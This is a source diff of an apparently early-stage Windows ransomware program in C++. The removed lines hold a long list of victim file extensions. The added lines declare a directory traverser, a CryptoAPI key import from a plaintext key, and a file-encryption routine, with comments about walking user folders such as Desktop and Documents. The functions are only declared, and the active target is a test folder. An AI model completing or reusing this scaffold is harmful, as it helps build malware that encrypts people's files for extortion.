@@ -1,27 +1,45 @@
 #include <iostream>
-#include <fstream>
-#include <windows.h>
+#include <Windows.h>
+#include <string>
 
-const char* targetExts[] = { ".pl", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".d3dbsp", ".sc2save", ".sie",
-".sum", ".bkp", ".flv", ".js", ".raw", ".jpeg", ".tar", ".zip", ".tar.gz", ".cmd",
-".key", ".DOT", ".docm", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
-".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx",
-".html", ".xml", ".psd", ".bmp", ".pdf", ".py", ".rtf" };
 
+//Global variables and a plainkeyblob
+
+//const char* targetDirs[] = { "Desktop","Documents","Downloads","Favorites","Music","Pictures", "Videos" };
+
+LPCWSTR targetDirs[] = { L"C:\\dev\\fake_dir" };
+
+
+
+
+//Function declarations
+
+bool traverse(LPCWSTR targetDir, int nLevel = 0);
+HCRYPTKEY keyimport();
+int encryptFile(LPCWSTR srcFile, LPCWSTR dstFile, HCRYPTKEY clé, HCRYPTPROV context);
+
+// main : 
+
+//Use of import with the plaintextkey[] byte array, which returns a key
+
+//Use of a for loop for every entry in the target dirs :
+//traverse the directory and apply encrypt to the FILES only
 
 int wmain() {
 
-	WIN32_FIND_DATA* file_data = NULL;
-	HANDLE hFind = NULL;
-	LPCWSTR pzDestDirectory = L"destdir";
+	//HCRYPTKEY clé = NULL;
+	//HPROV contexte = NULL;
+	//keyimport(clé,context);
+	// 
+	//DWORD username = GetUserNameW(NULL, &username);
 
-	hFind = FindFirstFileW(pzDestDirectory,file_data);
-	if (hFind == INVALID_HANDLE_VALUE) {
-		std::cout << "FindFirstFile failed, with errorcode : " <<  GetLastError() << std::endl;
-		return -1;
-	}
+	/*for (LPCWSTR singledir : targetDirs) {
+		
+		traverse(singledir);
+	}*/
 
 
-	
+
+
 	return 0;
 }
